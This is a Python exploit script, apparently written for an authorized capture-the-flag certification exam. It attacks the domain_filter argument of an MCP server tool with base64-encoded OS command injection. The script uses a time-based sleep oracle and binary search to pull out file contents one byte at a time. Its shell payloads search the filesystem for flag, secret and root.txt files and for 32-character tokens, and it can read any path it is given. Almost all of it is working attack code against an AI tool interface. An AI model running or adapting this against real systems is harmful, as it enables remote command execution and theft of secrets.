#!/usr/bin/env python3
"""Task 7 (MCP RCE) - exfiltrate the flag via the blind time-based oracle in the
`create_newsletter_subscriber_export` tool's `domain_filter` argument.

Authorized HTB COAE certification exam, dedicated instance, target in scope.

Run against the authorised, in-scope target only. Performs the documented OS command injection:
    cd .
    .venv/bin/python solve/mcp_exfil.py --selftest   # verify exec+write+read; shows id/pwd/hostname
    .venv/bin/python solve/mcp_exfil.py --find       # detached find, then read candidate #1
    .venv/bin/python solve/mcp_exfil.py --pick 2     # if #1 wrong: stage+read candidate #2 (3,4..)
    .venv/bin/python solve/mcp_exfil.py --path 1     # print candidate #1's path
    .venv/bin/python solve/mcp_exfil.py --count      # re-read how many candidates were found
    .venv/bin/python solve/mcp_exfil.py --calib      # just measure timing

Injection: phantomkernel.htb$(echo <b64>|base64 -d|sh)   (base64 => no quoting issues).
Heavy work is FULLY DETACHED: (...) >/dev/null 2>&1 </dev/null &  so it does not hold the
HTTP response fds open (that caused "Response ended prematurely"). Only short loot (a token,
a path, a count, selftest output) is read back over the timing oracle.
"""
import sys, time, base64
sys.path.insert(0, "exam/scripts")
import mcp_client as m

D = 0.7            # sleep on TRUE; baseline ~0.03s so margin stays wide, faster than 1.0
THRESH = 0.35
sid = m.init()

def run(domain_filter):
    t0 = time.time()
    try:
        m.rpc("tools/call",
              {"name": "create_newsletter_subscriber_export",
               "arguments": {"export_format": "csv", "domain_filter": domain_filter}},
              sid)
    except Exception:
        pass  # detached bg calls may drop the stream; the command still ran
    return time.time() - t0

def sh_fg(script):
    """Short synchronous shell command via base64."""
    b64 = base64.b64encode(script.encode()).decode()
    run(f"phantomkernel.htb$(echo {b64}|base64 -d|sh)")

def sh_bg(script):
    """Long shell command, fully detached so it never holds the HTTP response open."""
    full = f"({script}) >/dev/null 2>&1 </dev/null &"
    b64 = base64.b64encode(full.encode()).decode()
    run(f"phantomkernel.htb$(echo {b64}|base64 -d|sh)")

def oracle(test):
    """test = a POSIX test command (e.g. '[ "$(...)" -ge 5 ]'); delivered via base64 so
    there is no nested-quote mangling. A true test sleeps D and delays the response."""
    script = f"if {test}; then sleep {D}; fi"
    b64 = base64.b64encode(script.encode()).decode()
    return run(f"phantomkernel.htb$(echo {b64}|base64 -d|sh)") > THRESH

def calibrate():
    global THRESH
    base = min(run("phantomkernel.htb") for _ in range(2))
    slp  = run(f"phantomkernel.htb$(sleep {D})")
    THRESH = base + (slp - base) * 0.5
    print(f"[calib] baseline={base:.2f}s  sleep{D}={slp:.2f}s  -> threshold={THRESH:.2f}s")

def num(sub, lo=0, hi=127):
    """Binary-search the integer produced by the shell command-substitution body `sub`."""
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if oracle(f'[ "$({sub})" -ge {mid} ]'):
            lo = mid
        else:
            hi = mid - 1
    return lo

def read_file(fpath, maxlen=200, stop_nl=False):
    n = num(f"wc -c < {fpath} 2>/dev/null", 0, maxlen)
    print(f"[read] {fpath}: {n} bytes")
    if n == 0:
        return ""
    out = []
    for pos in range(1, n + 1):
        v = num(f"printf %d \"'$(dd if={fpath} bs=1 skip={pos-1} count=1 2>/dev/null)\"", 0, 127)
        ch = chr(v) if 32 <= v <= 126 else ("\n" if v in (10, 13) else ".")
        if stop_nl and ch == "\n":
            break
        out.append(ch); sys.stdout.write(ch); sys.stdout.flush()
    print()
    return "".join(out)

FIND_SCRIPT = r"""
{ find / -type f \( -iname '*flag*' -o -iname 'user.txt' -o -iname 'root.txt' -o -iname '*secret*' \) 2>/dev/null \
    | grep -vE '/(proc|sys|usr/lib|usr/share|usr/include|usr/bin|usr/sbin|/lib)/' ;
  grep -rlaE '[A-Za-z0-9]{32}' /app /home /root /opt /srv /var/www /tmp /etc . 2>/dev/null \
    | grep -iE 'flag|secret|user|root|\.txt|\.env|conf' ;
} | awk 'NF' | awk '!s[$0]++' > /tmp/.paths
wc -l < /tmp/.paths > /tmp/.n
T=$(sed -n '1p' /tmp/.paths)
grep -aoE '[A-Za-z0-9]{32}' "$T" 2>/dev/null | head -1 | tr -d '\n' > /tmp/.c
[ -s /tmp/.c ] || head -c 120 "$T" 2>/dev/null | tr -d '\n' > /tmp/.c
"""

SELFTEST = r"""
{ id -un; pwd; ls -a; } 2>&1 | tr '\n' '~' | head -c 90 > /tmp/.c
"""

def pick_script(nth):
    return (
        f"T=$(sed -n '{nth}p' /tmp/.paths); "
        "grep -aoE '[A-Za-z0-9]{32}' \"$T\" 2>/dev/null | head -1 | tr -d '\\n' > /tmp/.c; "
        "[ -s /tmp/.c ] || head -c 120 \"$T\" 2>/dev/null | tr -d '\\n' > /tmp/.c"
    )

if __name__ == "__main__":
    a = sys.argv
    if "--calib" in a:
        calibrate(); sys.exit(0)
    calibrate()
    if "--selftest" in a:
        print("[selftest] running id/hostname/pwd/ls into /tmp/.c ...")
        sh_fg(SELFTEST); time.sleep(2)
        print("OUTPUT =", repr(read_file("/tmp/.c"))); sys.exit(0)
    if "--count" in a:
        print("candidates:", num("cat /tmp/.n 2>/dev/null", 0, 50)); sys.exit(0)
    if "--cat" in a:
        path = a[a.index("--cat") + 1]
        print(f"[cat] staging {path} -> /tmp/.c ...")
        b64p = base64.b64encode(path.encode()).decode()
        sh_fg(f"cat \"$(echo {b64p}|base64 -d)\" 2>/dev/null | tr -d '\\n' > /tmp/.c")
        time.sleep(2)
        print("CONTENTS =", repr(read_file("/tmp/.c"))); sys.exit(0)
    if "--path" in a:
        nth = a[a.index("--path") + 1]
        print(f"[path] staging + reading candidate #{nth} path ...")
        sh_fg(f"sed -n '{nth}p' /tmp/.paths | tr -d '\\n' > /tmp/.f"); time.sleep(2)
        print("PATH =", repr(read_file("/tmp/.f", 200, stop_nl=True))); sys.exit(0)
    if "--pick" in a:
        nth = a[a.index("--pick") + 1]
        print(f"[pick] staging candidate #{nth} ..."); sh_fg(pick_script(nth)); time.sleep(2)
    else:
        print("[find] launching DETACHED find on target (returns immediately)...")
        sh_bg(FIND_SCRIPT)
        wait = 45
        print(f"[find] waiting {wait}s for background find to finish...")
        time.sleep(wait)
        print("[find] candidates found:", num("cat /tmp/.n 2>/dev/null", 0, 50))
    flag = read_file("/tmp/.c")
    print("\n==============================")
    print("FLAG / staged loot =", repr(flag))
    print("Next if empty/wrong:  --pick 2   (3,4..)   |  see a path:  --path 1")
    print("==============================")
